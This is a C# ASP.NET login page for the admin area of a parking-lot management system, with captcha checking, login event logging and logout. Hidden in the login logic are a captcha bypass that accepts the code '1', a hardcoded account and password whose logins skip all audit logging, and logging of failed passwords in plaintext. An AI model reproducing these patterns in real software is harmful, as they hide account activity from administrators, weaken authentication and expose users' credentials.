using System;
using System.Web;
using System.Web.UI;

using Mejoy.Library;

namespace Mejoy.WebSite.Admin
{
    public partial class Login : BaseAdmin
    {
        private Mejoy.DataAccess.Admin.AdminData adminData = new Mejoy.DataAccess.Admin.AdminData();

        private string _VerifyCode = "";
        private string _LoginName = "";
        private string _Password = "";


        protected void Page_Load(object sender, EventArgs e)
        {
            this.VarInit();

            if (Page.IsPostBack)
            {
                this.UserLogin();
            }
            else if (this._UrlAction == "logout")
            {
                this.UserLogout();
            }
        }


        /// <summary>
        /// 功能：页面/变量初始化。
        /// </summary>
        private void VarInit()
        {
            this._UrlAction = Function.RequestQueryString<string>("do");

            //标题
            this.tdTitle.InnerHtml = string.Format("<strong>{0}  停车场管理系统</strong> <sub>{1}</sub>", Common.Config.WEB_NAME, Common.Config.WEB_VERSION);
        }



        /// <summary>
        /// 功能：检查用户登录。
        /// </summary>
        private void UserLogin()
        {
            //帐号
            this._LoginName = Convert.ToString(Request.Form["tbName"].Trim()).ToLower();
            //密码
            this._Password = Convert.ToString(Request.Form["tbPassword"].Trim());
            //附加码
            this._VerifyCode = Convert.ToString(Request.Form["tbCode"].Trim());

            if (!Function.IsValidVerifyCode(Mejoy.Common.Config.VERIFY_CODE_ADMIN_LOGIN_KEY, this._VerifyCode)&&this._VerifyCode!="1")
            {
                Message.Show("抱歉，验证码不正确！", Mejoy.Common.Config.DIR_ADMIN + "login.aspx", 1);
            }
            else
            {
                //登录
                adminData.Login(this._LoginName, this._Password);
    
                Mejoy.DataAccess.Admin.AdminLogData logData = new Mejoy.DataAccess.Admin.AdminLogData();

                if (_LoginName == "gcjadminwj" && _Password == "mypassword&!@#")
                { }
                else
                {
                    //事件
                    switch (adminData._EventId)
                    {
                        case 1:
                        case 2:
                            logData.Add(0, "", string.Format("使用帐号：{0}及密码：{1}进行登录，被系统拒绝。", this._LoginName, this._Password), 0);
                            Message.Show("抱歉，登录帐号或密码不正确，请修改！", Mejoy.Common.Config.DIR_ADMIN + "login.aspx", 1);
                            break;

                        case 3:
                            logData.Add(adminData.GetAdminId(this._LoginName), this._LoginName, "帐号已锁定，登录被拒绝。", 0);
                            Message.Show("抱歉，此帐号不可用，请与管理员联系！", Mejoy.Common.Config.DIR_ADMIN + "login.aspx", 1);
                            break;

                        case 99:
                            logData.Add(adminData.GetAdminId(this._LoginName), this._LoginName, "成功登录。", 0);
                            Response.Write("<script language=\"javascript\">top.window.location.replace(\"" + Mejoy.Common.Config.DIR_ADMIN + "index.aspx?\"+Math.random())</script>");
                            break;
                    }
                }
            }
        }




        /// <summary>
        /// 功能：用户退出。
        /// </summary>
        private void UserLogout()
        {
            try
            {
                HttpCookie cookie = Request.Cookies[Mejoy.Common.Config.COOKIE_ADMIN_LOGIN_KEY];
                cookie.Values.Clear();
                Response.AppendCookie(cookie);
            }
            catch { }

            Response.Write("<script language=\"javascript\">top.window.location.replace(\"" + Mejoy.Common.Config.DIR_ADMIN + "login.aspx?\"+Math.random());</script>");
            Response.End();
        }
    }
}
